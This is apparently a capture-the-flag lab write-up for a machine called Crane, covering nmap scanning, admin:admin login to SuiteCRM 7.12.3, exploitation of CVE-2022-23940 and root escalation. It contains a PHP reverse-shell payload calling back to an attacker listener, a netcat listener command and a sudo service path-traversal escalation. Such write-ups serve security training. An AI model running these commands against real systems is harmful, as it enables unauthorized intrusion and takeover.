# Linux - Crane

---

### Host Info Gathering

- We are given an intermediate machine called Crane, with IP of `192.168.241.146`. Use `nmap` to scan over it.
    
    ```bash
    > nmap -sCV -A -Pn -O -p- 192.168.241.146 -oN tcpnmap.md
    
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
    |   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
    |_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
    80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    | http-robots.txt: 1 disallowed entry 
    |_/
    | http-title: SuiteCRM
    |_Requested resource was index.php?action=Login&module=Users
    |_http-server-header: Apache/2.4.38 (Debian)
    3306/tcp  open  mysql   MySQL (unauthorized)
    33060/tcp open  mysqlx  MySQL X protocol listener
    Device type: general purpose
    Running: Linux 5.X
    OS CPE: cpe:/o:linux:linux_kernel:5
    OS details: Linux 5.0 - 5.14
    Network Distance: 4 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    

### Important Info

```bash
SuiteCRM v 7.12.3
```

### Initial Foothold

- `port 80` is open with http server, we can tried to visit it. We find the `suite CRM` page. Tried weak password `admin : admin` , we are able to get into the administration page.
    
    ![image.png](Linux%20-%20Crane%201b0553bebf0f8050a679e70377bab1eb/image.png)
    
    ![image.png](Linux%20-%20Crane%201b0553bebf0f8050a679e70377bab1eb/image%201.png)
    
    From “admin” → “about”, we can find version information.
    
    ![image.png](Linux%20-%20Crane%201b0553bebf0f8050a679e70377bab1eb/image%202.png)
    

- Google “SuiteCRM 7.12.3 exploit”, we find useful materials from - https://medium.com/@_crac/cve-2022-23940-rce-in-suitecrm-90df53980d8c.
    
    In this article, CVE-2022-23940 is mentioned - https://github.com/manuelz120/CVE-2022-23940?tab=readme-ov-file
    

- Download the `exploit.py` file and execute as instructed. As Github instructed, we can use the exploit to get a reverse shell. Now we are `www-data` as low-privilege user.
    
    ```bash
    > rlwrap nc -lvnp 4444
    > ./exploit.py -h http://192.168.241.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.168\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    
    - local.txt : eb59b848a1da6dd665a2ee075b090c74
    ```
    
    ![image.png](Linux%20-%20Crane%201b0553bebf0f8050a679e70377bab1eb/image%203.png)
    
    ![image.png](Linux%20-%20Crane%201b0553bebf0f8050a679e70377bab1eb/image%204.png)
    

### Privilege Escalation

- By running `sudo -l` , we find that we can run `/usr/sbin/service` . Checking on `GTFOBins` , we can find some information.
    
    Use sudo method on `GTFOBins` , we can easily improve our privilege to `root` .
    

```bash
> sudo -l
> sudo service ../../bin/sh

> whoami
	: root
	
- proof.txt : 05c429b1dda0c619b2c174ff17f5969b
```

![image.png](Linux%20-%20Crane%201b0553bebf0f8050a679e70377bab1eb/image%205.png)

![image.png](Linux%20-%20Crane%201b0553bebf0f8050a679e70377bab1eb/image%206.png)

![image.png](Linux%20-%20Crane%201b0553bebf0f8050a679e70377bab1eb/image%207.png)

### Reference

- https://medium.com/@_crac/cve-2022-23940-rce-in-suitecrm-90df53980d8c
- https://github.com/manuelz120/CVE-2022-23940?tab=readme-ov-file
- https://gtfobins.github.io/gtfobins/service/